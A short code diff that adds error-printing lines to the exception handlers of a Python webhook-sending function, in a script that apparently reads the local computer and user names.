@@ -39,10 +39,12 @@ def send_webhook(message):
             response.read()
         return True
     except urllib.error.HTTPError as e:
+        print("HTTP error:", e.code, e.read().decode())
         return False
     except Exception as e:
+        print("Error:", e)
         return False
-
+        
 if __name__ == "__main__":
     computer_name = os.environ.get("COMPUTERNAME", socket.gethostname())
     user_name = os.environ.get("USERNAME", "SYSTEM")
